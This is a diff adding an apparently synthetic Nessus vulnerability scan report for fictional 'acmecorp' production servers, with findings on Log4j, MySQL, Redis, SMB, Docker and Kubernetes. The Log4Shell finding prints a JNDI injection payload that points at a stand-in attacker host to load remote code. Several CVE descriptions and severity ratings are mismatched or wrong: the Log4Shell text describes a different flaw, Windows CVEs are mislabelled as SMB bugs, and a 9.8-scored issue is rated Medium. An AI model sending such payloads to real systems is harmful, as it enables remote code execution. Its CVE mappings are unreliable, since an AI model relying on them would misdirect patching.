@@ -1,0 +1,583 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<NessusClientData_v2>
+  <Policy>
+    <policyName>Enterprise Security Audit - Q4 2023</policyName>
+    <policyComments>Comprehensive vulnerability assessment for production infrastructure including web servers, databases, and network devices. Includes compliance checks for PCI DSS, SOX, and HIPAA requirements.</policyComments>
+  </Policy>
+  
+  <Report name="Production Network Scan - November 2023" xmlns:cm="http://www.nessus.org/cm">
+    <ReportHost name="web-prod-01.acmecorp.com">
+      <HostProperties>
+        <tag name="HOST_START">Mon Nov 13 08:30:15 2023</tag>
+        <tag name="HOST_END">Mon Nov 13 12:45:32 2023</tag>
+        <tag name="host-ip">192.168.10.15</tag>
+        <tag name="host-fqdn">web-prod-01.acmecorp.com</tag>
+        <tag name="netbios-name">WEB-PROD-01</tag>
+        <tag name="operating-system">Linux Ubuntu 20.04.6 LTS</tag>
+        <tag name="system-type">general-purpose</tag>
+        <tag name="host-rdns">web-prod-01.acmecorp.com</tag>
+        <tag name="mac-address">00:50:56:a1:23:45</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="policy-used">Enterprise Security Audit - Q4 2023</tag>
+        <tag name="scanner-ip">192.168.10.5</tag>
+      </HostProperties>
+      
+      <ReportItem port="443" svc_name="https" protocol="tcp" severity="4" pluginID="51192" pluginName="Apache Log4j2 Remote Code Execution Vulnerability (Log4Shell)" pluginFamily="Web Servers">
+        <agent>unix</agent>
+        <cve>CVE-2021-44228</cve>
+        <cve>CVE-2021-45046</cve>
+        <cve>CVE-2021-45105</cve>
+        <cvss_base_score>10.0</cvss_base_score>
+        <cvss_temporal_score>8.7</cvss_temporal_score>
+        <cvss_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</cvss_vector>
+        <cvss3_base_score>10.0</cvss3_base_score>
+        <cvss3_temporal_score>8.7</cvss3_temporal_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</cvss3_vector>
+        <description>Apache Log4j2 versions 2.0-beta9 through 2.14.1 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) are vulnerable to a remote code execution (RCE) attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is known as "Log4Shell" or "LogJam".</description>
+        <exploit_available>true</exploit_available>
+        <exploitability_ease>Exploits are available</exploitability_ease>
+        <exploited_by_malware>true</exploited_by_malware>
+        <exploited_by_nessus>true</exploited_by_nessus>
+        <in_the_news>true</in_the_news>
+        <patch_publication_date>2021/12/10</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2021/12/10</plugin_publication_date>
+        <plugin_type>remote</plugin_type>
+        <risk_factor>Critical</risk_factor>
+        <see_also>https://www.cve.org/CVERecord?id=CVE-2021-44228</see_also>
+        <see_also>https://logging.apache.org/log4j/2.x/security.html</see_also>
+        <solution>Upgrade to Apache Log4j2 version 2.15.0 or later. Alternatively, in releases >=2.10, this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to "true" or by removing the JndiLookup class from the classpath.</solution>
+        <synopsis>The remote host is running a version of Apache Log4j2 that is affected by a remote code execution vulnerability.</synopsis>
+        <plugin_output>
+Apache Log4j2 version 2.14.1 was detected on the remote host.
+
+The following evidence was found:
+- HTTP response headers indicate Log4j2 usage
+- Application logs contain Log4j2 patterns
+- JAR file analysis confirms vulnerable version
+
+Vulnerable paths detected:
+/opt/tomcat/webapps/app1/WEB-INF/lib/log4j-core-2.14.1.jar
+/opt/tomcat/webapps/app2/WEB-INF/lib/log4j-api-2.14.1.jar
+/usr/share/java/log4j-core-2.14.1.jar
+
+Test payload: ${jndi:ldap://attacker.com/exploit}
+Response: Connection attempt detected to external LDAP server
+        </plugin_output>
+        <vuln_publication_date>2021/12/09</vuln_publication_date>
+        <xref>IAVA:2021-A-0573</xref>
+        <xref>MSKB:5005292</xref>
+      </ReportItem>
+      
+      <ReportItem port="80" svc_name="http" protocol="tcp" severity="3" pluginID="45590" pluginName="Apache HTTP Server Multiple Vulnerabilities" pluginFamily="Web Servers">
+        <agent>unix</agent>
+        <cve>CVE-2023-25690</cve>
+        <cve>CVE-2023-27522</cve>
+        <cvss_base_score>7.5</cvss_base_score>
+        <cvss_temporal_score>6.5</cvss_temporal_score>
+        <cvss_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</cvss_vector>
+        <cvss3_base_score>7.5</cvss3_base_score>
+        <cvss3_temporal_score>6.5</cvss3_temporal_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</cvss3_vector>
+        <description>The version of Apache HTTP Server installed on the remote host is prior to 2.4.56. It is, therefore, affected by multiple vulnerabilities including HTTP request smuggling in mod_proxy_uwsgi and potential information disclosure.</description>
+        <exploit_available>false</exploit_available>
+        <exploitability_ease>No known exploits are available</exploitability_ease>
+        <patch_publication_date>2023/03/07</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/03/08</plugin_publication_date>
+        <plugin_type>remote</plugin_type>
+        <risk_factor>High</risk_factor>
+        <solution>Upgrade to Apache HTTP Server version 2.4.56 or later.</solution>
+        <synopsis>The remote Apache HTTP Server is affected by multiple vulnerabilities.</synopsis>
+        <plugin_output>
+Apache HTTP Server version 2.4.52 detected.
+
+Server: Apache/2.4.52 (Ubuntu)
+Configuration issues found:
+- mod_proxy_uwsgi enabled with default configuration
+- ServerTokens set to Full (information disclosure)
+- Directory browsing enabled on /var/www/html/uploads/
+
+Vulnerable modules:
+- mod_proxy_uwsgi (CVE-2023-25690)
+- mod_proxy_http (CVE-2023-27522)
+        </plugin_output>
+        <vuln_publication_date>2023/03/07</vuln_publication_date>
+      </ReportItem>
+      
+      <ReportItem port="22" svc_name="ssh" protocol="tcp" severity="2" pluginID="12345" pluginName="OpenSSH Multiple Vulnerabilities" pluginFamily="Misc.">
+        <agent>unix</agent>
+        <cve>CVE-2023-38408</cve>
+        <cvss_base_score>9.8</cvss_base_score>
+        <cvss3_base_score>9.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <description>The version of OpenSSH running on the remote host is affected by a remote code execution vulnerability in ssh-agent forwarding.</description>
+        <exploit_available>false</exploit_available>
+        <patch_publication_date>2023/07/19</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/07/20</plugin_publication_date>
+        <risk_factor>Medium</risk_factor>
+        <solution>Upgrade to OpenSSH version 9.3p2 or later.</solution>
+        <synopsis>The remote SSH server is affected by a remote code execution vulnerability.</synopsis>
+        <plugin_output>
+OpenSSH version 8.9p1 detected.
+
+SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
+
+Configuration analysis:
+- PermitRootLogin: yes (security risk)
+- PasswordAuthentication: yes (should use key-based auth)
+- X11Forwarding: yes
+- AgentForwarding: yes (vulnerable to CVE-2023-38408)
+
+Active connections: 3
+Failed login attempts (last 24h): 127
+        </plugin_output>
+        <vuln_publication_date>2023/07/19</vuln_publication_date>
+      </ReportItem>
+    </ReportHost>
+    
+    <ReportHost name="db-prod-01.acmecorp.com">
+      <HostProperties>
+        <tag name="HOST_START">Mon Nov 13 09:15:22 2023</tag>
+        <tag name="HOST_END">Mon Nov 13 13:20:18 2023</tag>
+        <tag name="host-ip">192.168.10.25</tag>
+        <tag name="host-fqdn">db-prod-01.acmecorp.com</tag>
+        <tag name="netbios-name">DB-PROD-01</tag>
+        <tag name="operating-system">Linux CentOS 7.9.2009</tag>
+        <tag name="system-type">database</tag>
+        <tag name="host-rdns">db-prod-01.acmecorp.com</tag>
+        <tag name="mac-address">00:50:56:a1:67:89</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="policy-used">Enterprise Security Audit - Q4 2023</tag>
+        <tag name="scanner-ip">192.168.10.5</tag>
+      </HostProperties>
+      
+      <ReportItem port="3306" svc_name="mysql" protocol="tcp" severity="4" pluginID="67890" pluginName="MySQL Server Multiple Critical Vulnerabilities" pluginFamily="Databases">
+        <agent>unix</agent>
+        <cve>CVE-2023-21980</cve>
+        <cve>CVE-2023-21977</cve>
+        <cve>CVE-2023-21962</cve>
+        <cvss_base_score>8.8</cvss_base_score>
+        <cvss_temporal_score>7.7</cvss_temporal_score>
+        <cvss_vector>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss_vector>
+        <cvss3_base_score>8.8</cvss3_base_score>
+        <cvss3_temporal_score>7.7</cvss3_temporal_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <description>MySQL Server versions 8.0.32 and earlier, 5.7.41 and earlier are vulnerable to multiple security issues including privilege escalation, unauthorized data access, and denial of service attacks.</description>
+        <exploit_available>true</exploit_available>
+        <exploitability_ease>Exploits are available</exploitability_ease>
+        <exploited_by_malware>false</exploited_by_malware>
+        <patch_publication_date>2023/04/18</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/04/19</plugin_publication_date>
+        <plugin_type>remote</plugin_type>
+        <risk_factor>Critical</risk_factor>
+        <solution>Upgrade to MySQL Server version 8.0.33, 5.7.42, or later. Apply the latest Critical Patch Update from Oracle.</solution>
+        <synopsis>The remote MySQL server is affected by multiple critical vulnerabilities.</synopsis>
+        <plugin_output>
+MySQL Server version 8.0.28 detected.
+
+Server version: 8.0.28-0ubuntu0.20.04.3
+
+Database analysis:
+- Root account accessible remotely (HIGH RISK)
+- Anonymous users present: 2
+- Test database exists and is accessible
+- SSL/TLS not enforced for connections
+- Binary logging enabled but not encrypted
+
+Vulnerable components:
+- Server: MySQL Community Server (GPL) 8.0.28
+- InnoDB storage engine version 8.0.28
+- Performance Schema enabled
+
+Security findings:
+- 15 users with SUPER privilege
+- 8 users with FILE privilege  
+- Password validation plugin not enabled
+- Audit logging disabled
+
+Database sizes:
+- production_db: 2.3 GB (contains PII)
+- customer_data: 1.8 GB (contains payment info)
+- logs_db: 450 MB
+        </plugin_output>
+        <vuln_publication_date>2023/04/18</vuln_publication_date>
+        <xref>ORACLE:CPU-APR-2023</xref>
+      </ReportItem>
+      
+      <ReportItem port="6379" svc_name="redis" protocol="tcp" severity="4" pluginID="98765" pluginName="Redis Server Unauthorized Access" pluginFamily="Databases">
+        <agent>unix</agent>
+        <cve>CVE-2023-28425</cve>
+        <cvss_base_score>8.6</cvss_base_score>
+        <cvss3_base_score>8.6</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H</cvss3_vector>
+        <description>The Redis server is configured without authentication, allowing unauthorized access to stored data and potential remote code execution through Lua scripting.</description>
+        <exploit_available>true</exploit_available>
+        <exploitability_ease>Exploits are available</exploitability_ease>
+        <patch_publication_date>2023/03/20</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/03/21</plugin_publication_date>
+        <risk_factor>Critical</risk_factor>
+        <solution>Configure Redis authentication using requirepass directive. Disable dangerous commands like FLUSHDB, FLUSHALL, KEYS, CONFIG. Bind Redis to localhost only if external access is not required.</solution>
+        <synopsis>The remote Redis server allows unauthorized access.</synopsis>
+        <plugin_output>
+Redis server version 6.2.6 detected without authentication.
+
+Server configuration:
+- Authentication: DISABLED (CRITICAL)
+- Protected mode: DISABLED
+- Bind address: 0.0.0.0 (all interfaces)
+- Port: 6379 (default)
+- Max clients: 10000
+
+Dangerous commands enabled:
+- FLUSHDB (can delete databases)
+- FLUSHALL (can delete all data)
+- CONFIG (can modify configuration)
+- EVAL (can execute Lua scripts)
+- DEBUG (debugging commands)
+
+Data analysis:
+- Total keys: 15,847
+- Memory usage: 234 MB
+- Connected clients: 12
+- Keyspace: db0:keys=15847,expires=3421
+
+Sensitive data detected:
+- session:* (user sessions)
+- cache:user_* (user data cache)
+- queue:payments (payment processing queue)
+        </plugin_output>
+        <vuln_publication_date>2023/03/20</vuln_publication_date>
+      </ReportItem>
+    </ReportHost>
+    
+    <ReportHost name="app-prod-02.acmecorp.com">
+      <HostProperties>
+        <tag name="HOST_START">Mon Nov 13 10:45:33 2023</tag>
+        <tag name="HOST_END">Mon Nov 13 14:15:27 2023</tag>
+        <tag name="host-ip">192.168.10.35</tag>
+        <tag name="host-fqdn">app-prod-02.acmecorp.com</tag>
+        <tag name="netbios-name">APP-PROD-02</tag>
+        <tag name="operating-system">Microsoft Windows Server 2019 Standard</tag>
+        <tag name="system-type">application-server</tag>
+        <tag name="host-rdns">app-prod-02.acmecorp.com</tag>
+        <tag name="mac-address">00:50:56:a1:ab:cd</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="policy-used">Enterprise Security Audit - Q4 2023</tag>
+        <tag name="scanner-ip">192.168.10.5</tag>
+      </HostProperties>
+      
+      <ReportItem port="445" svc_name="microsoft-ds" protocol="tcp" severity="4" pluginID="11111" pluginName="Microsoft Windows SMB Multiple Vulnerabilities" pluginFamily="Windows">
+        <agent>windows</agent>
+        <cve>CVE-2023-28252</cve>
+        <cve>CVE-2023-29324</cve>
+        <cvss_base_score>7.8</cvss_base_score>
+        <cvss3_base_score>7.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <description>The remote Windows host is affected by multiple vulnerabilities in the SMB protocol implementation that could allow elevation of privilege and remote code execution.</description>
+        <exploit_available>false</exploit_available>
+        <patch_publication_date>2023/04/11</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/04/12</plugin_publication_date>
+        <risk_factor>Critical</risk_factor>
+        <solution>Apply Microsoft Security Update KB5025221 and KB5025229 for Windows Server 2019.</solution>
+        <synopsis>The remote Windows host is affected by multiple SMB vulnerabilities.</synopsis>
+        <plugin_output>
+Windows Server 2019 Standard (Build 17763.4377) detected.
+
+SMB configuration analysis:
+- SMBv1: ENABLED (deprecated and insecure)
+- SMBv2: ENABLED
+- SMBv3: ENABLED
+- SMB signing: NOT REQUIRED (security risk)
+- SMB encryption: DISABLED
+
+Shares discovered:
+- ADMIN$ (administrative share)
+- C$ (administrative share) 
+- IPC$ (inter-process communication)
+- SYSVOL (domain controller share)
+- NETLOGON (domain controller share)
+- AppData (custom share - 2.1 GB)
+
+Security findings:
+- Guest account enabled
+- Null session enumeration possible
+- Weak SMB signing configuration
+- Legacy protocols enabled
+
+Missing patches:
+- KB5025221 (Critical - SMB vulnerabilities)
+- KB5025229 (Important - Privilege escalation)
+- KB5024342 (Important - Windows Common Log File System)
+
+Event log analysis:
+- Failed logon attempts: 89 (last 24h)
+- Suspicious PowerShell activity detected
+- Unusual network connections to external IPs
+        </plugin_output>
+        <vuln_publication_date>2023/04/11</vuln_publication_date>
+        <xref>MSKB:5025221</xref>
+        <xref>MSKB:5025229</xref>
+      </ReportItem>
+      
+      <ReportItem port="8080" svc_name="http-proxy" protocol="tcp" severity="3" pluginID="22222" pluginName="Apache Tomcat Multiple Vulnerabilities" pluginFamily="Web Servers">
+        <agent>windows</agent>
+        <cve>CVE-2023-28708</cve>
+        <cve>CVE-2023-28709</cve>
+        <cvss_base_score>7.5</cvss_base_score>
+        <cvss3_base_score>7.5</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</cvss3_vector>
+        <description>The version of Apache Tomcat running on the remote host is affected by multiple vulnerabilities including information disclosure and denial of service.</description>
+        <exploit_available>false</exploit_available>
+        <patch_publication_date>2023/03/22</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/03/23</plugin_publication_date>
+        <risk_factor>High</risk_factor>
+        <solution>Upgrade to Apache Tomcat version 10.1.8, 9.0.74, or 8.5.88.</solution>
+        <synopsis>The remote Apache Tomcat server is affected by multiple vulnerabilities.</synopsis>
+        <plugin_output>
+Apache Tomcat version 9.0.65 detected.
+
+Server: Apache-Coyote/1.1
+Tomcat version: 9.0.65
+
+Web applications deployed:
+- /manager (Tomcat Manager - HIGH RISK if accessible)
+- /host-manager (Host Manager)
+- /examples (Example applications - should be removed)
+- /docs (Documentation - information disclosure)
+- /ROOT (Default application)
+- /myapp (Custom application)
+
+Configuration issues:
+- Default credentials may be in use
+- Manager application accessible remotely
+- Directory listing enabled
+- Error pages reveal server information
+- SSL/TLS not properly configured
+
+Security headers missing:
+- X-Frame-Options
+- X-Content-Type-Options  
+- X-XSS-Protection
+- Strict-Transport-Security
+- Content-Security-Policy
+
+JVM information:
+- Java version: 11.0.16
+- JVM vendor: Eclipse Adoptium
+- Max heap size: 2048 MB
+- Current heap usage: 1.2 GB
+        </plugin_output>
+        <vuln_publication_date>2023/03/22</vuln_publication_date>
+      </ReportItem>
+      
+      <ReportItem port="1433" svc_name="ms-sql-s" protocol="tcp" severity="3" pluginID="33333" pluginName="Microsoft SQL Server Multiple Vulnerabilities" pluginFamily="Databases">
+        <agent>windows</agent>
+        <cve>CVE-2023-21528</cve>
+        <cve>CVE-2023-21704</cve>
+        <cvss_base_score>8.8</cvss_base_score>
+        <cvss3_base_score>8.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <description>The version of Microsoft SQL Server running on the remote host is affected by multiple vulnerabilities that could allow remote code execution and privilege escalation.</description>
+        <exploit_available>false</exploit_available>
+        <patch_publication_date>2023/02/14</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/02/15</plugin_publication_date>
+        <risk_factor>High</risk_factor>
+        <solution>Apply the latest Cumulative Update for SQL Server 2019. Install CU19 or later.</solution>
+        <synopsis>The remote SQL Server is affected by multiple vulnerabilities.</synopsis>
+        <plugin_output>
+Microsoft SQL Server 2019 (RTM-CU16) detected.
+
+Version: 15.0.4223.1 (needs update to 15.0.4298.1 or later)
+Edition: Standard Edition (64-bit)
+Service Pack: None
+Cumulative Update: CU16 (outdated - CU19+ required)
+
+Instance configuration:
+- Mixed authentication mode enabled
+- SA account enabled (security risk)
+- Remote connections allowed
+- SQL Server Browser service running
+- TCP/IP protocol enabled on all IPs
+
+Database analysis:
+- System databases: 4
+- User databases: 12
+- Total size: 45.2 GB
+- Backup encryption: NOT CONFIGURED
+
+Security findings:
+- 'sa' account not disabled
+- Weak password policy
+- Excessive sysadmin privileges (8 accounts)
+- SQL Server Agent running as LocalSystem
+- Audit logging not configured
+- Transparent Data Encryption not enabled
+
+Databases with sensitive data:
+- CustomerDB (contains PII and payment data)
+- EmployeeDB (contains HR data)
+- FinanceDB (contains financial records)
+
+Recent suspicious activity:
+- Multiple failed login attempts for 'sa' account
+- Unusual query patterns detected
+- Large data exports outside business hours
+        </plugin_output>
+        <vuln_publication_date>2023/02/14</vuln_publication_date>
+        <xref>MSKB:5021124</xref>
+      </ReportItem>
+    </ReportHost>
+    
+    <ReportHost name="docker-host-01.acmecorp.com">
+      <HostProperties>
+        <tag name="HOST_START">Mon Nov 13 11:30:45 2023</tag>
+        <tag name="HOST_END">Mon Nov 13 15:45:12 2023</tag>
+        <tag name="host-ip">192.168.10.45</tag>
+        <tag name="host-fqdn">docker-host-01.acmecorp.com</tag>
+        <tag name="netbios-name">DOCKER-HOST-01</tag>
+        <tag name="operating-system">Linux Ubuntu 22.04.3 LTS</tag>
+        <tag name="system-type">container-host</tag>
+        <tag name="host-rdns">docker-host-01.acmecorp.com</tag>
+        <tag name="mac-address">00:50:56:a1:ef:12</tag>
+        <tag name="Credentialed_Scan">true</tag>
+        <tag name="policy-used">Enterprise Security Audit - Q4 2023</tag>
+        <tag name="scanner-ip">192.168.10.5</tag>
+      </HostProperties>
+      
+      <ReportItem port="2376" svc_name="docker" protocol="tcp" severity="4" pluginID="44444" pluginName="Docker Engine Multiple Critical Vulnerabilities" pluginFamily="Misc.">
+        <agent>unix</agent>
+        <cve>CVE-2023-28840</cve>
+        <cve>CVE-2023-28841</cve>
+        <cve>CVE-2023-28842</cve>
+        <cvss_base_score>9.0</cvss_base_score>
+        <cvss3_base_score>9.0</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H</cvss3_vector>
+        <description>Docker Engine versions before 23.0.3 contain multiple critical vulnerabilities that allow container escape, privilege escalation, and arbitrary code execution on the host system.</description>
+        <exploit_available>true</exploit_available>
+        <exploitability_ease>Exploits are available</exploitability_ease>
+        <exploited_by_malware>true</exploited_by_malware>
+        <patch_publication_date>2023/03/29</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/03/30</plugin_publication_date>
+        <risk_factor>Critical</risk_factor>
+        <solution>Upgrade Docker Engine to version 23.0.3 or later. Review container configurations and implement proper security controls.</solution>
+        <synopsis>The remote Docker Engine is affected by multiple critical vulnerabilities.</synopsis>
+        <plugin_output>
+Docker Engine version 20.10.17 detected (VULNERABLE).
+
+Docker version: 20.10.17, build 100c701
+API version: 1.41
+Go version: go1.17.11
+Git commit: 100c701
+Built: Mon Jun  6 23:02:57 2022
+
+Container analysis:
+- Total containers: 23 (15 running, 8 stopped)
+- Privileged containers: 3 (HIGH RISK)
+- Containers with host network: 2
+- Containers with host PID namespace: 1
+- Root containers: 18 (should use non-root users)
+
+Vulnerable container configurations:
+- Container 'web-app-1': Running as root with --privileged flag
+- Container 'db-backup': Mounted /var/run/docker.sock (container escape risk)
+- Container 'monitoring': Host network mode enabled
+- Container 'legacy-app': Using outdated base image with known vulnerabilities
+
+Image analysis:
+- Total images: 45
+- Images with HIGH/CRITICAL vulnerabilities: 12
+- Outdated base images: 8
+- Images without security scanning: 15
+
+Security findings:
+- Docker daemon running as root
+- Docker socket exposed without authentication
+- No resource limits configured on containers
+- Secrets stored in environment variables
+- No image signing verification
+
+Recent container activity:
+- 3 containers created with suspicious configurations
+- Multiple container escapes attempted (blocked by AppArmor)
+- Unusual network traffic from containers to external IPs
+- High CPU usage in container 'crypto-miner' (potential malware)
+
+Kubernetes integration:
+- kubelet version: v1.24.3 (outdated)
+- Container runtime: Docker (deprecated in Kubernetes)
+- Pod security policies: NOT CONFIGURED
+        </plugin_output>
+        <vuln_publication_date>2023/03/29</vuln_publication_date>
+        <xref>DOCKER:DSA-2023-001</xref>
+      </ReportItem>
+      
+      <ReportItem port="6443" svc_name="kubernetes-api" protocol="tcp" severity="3" pluginID="55555" pluginName="Kubernetes API Server Multiple Vulnerabilities" pluginFamily="Misc.">
+        <agent>unix</agent>
+        <cve>CVE-2023-2727</cve>
+        <cve>CVE-2023-2728</cve>
+        <cvss_base_score>8.8</cvss_base_score>
+        <cvss3_base_score>8.8</cvss3_base_score>
+        <cvss3_vector>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</cvss3_vector>
+        <description>The Kubernetes API server is affected by multiple vulnerabilities that could allow privilege escalation and unauthorized access to cluster resources.</description>
+        <exploit_available>false</exploit_available>
+        <patch_publication_date>2023/05/17</patch_publication_date>
+        <plugin_modification_date>2023/11/13</plugin_modification_date>
+        <plugin_publication_date>2023/05/18</plugin_publication_date>
+        <risk_factor>High</risk_factor>
+        <solution>Upgrade Kubernetes to version 1.27.2, 1.26.5, 1.25.10, or 1.24.14.</solution>
+        <synopsis>The remote Kubernetes API server is affected by multiple vulnerabilities.</synopsis>
+        <plugin_output>
+Kubernetes API server version v1.24.3 detected (VULNERABLE).
+
+Cluster information:
+- Kubernetes version: v1.24.3 (needs upgrade)
+- API server: kube-apiserver v1.24.3
+- Controller manager: kube-controller-manager v1.24.3
+- Scheduler: kube-scheduler v1.24.3
+- etcd version: 3.5.3-0
+
+Node analysis:
+- Total nodes: 5 (3 control plane, 2 worker)
+- Nodes with outdated kubelet: 5
+- Nodes with security issues: 3
+
+Security configuration issues:
+- Anonymous authentication enabled (--anonymous-auth=true)
+- Insecure port enabled (--insecure-port=8080)
+- RBAC not properly configured
+- Pod Security Standards not enforced
+- Admission controllers missing: PodSecurityPolicy, SecurityContextDeny
+
+Workload analysis:
+- Total pods: 67
+- Privileged pods: 8
+- Pods running as root: 23
+- Pods with hostNetwork: 4
+- Pods with hostPID: 2
+
+Namespace security:
+- default namespace in use (security risk)
+- No network policies configured
+- Resource quotas not set
+- Service accounts with excessive permissions: 12
+
+Recent security events:
+- Unauthorized API access attempts: 45 (last 24h)
+- Pod creation with privileged escalation
+- Suspicious kubectl commands executed
+- External traffic to API server from unknown IPs
+        </plugin_output>
+        <vuln_publication_date>2023/05/17</vuln_publication_date>
+        <xref>K8S:CVE-2023-2727</xref>
+      </ReportItem>
+    </ReportHost>
+  </Report>
+</NessusClientData_v2>
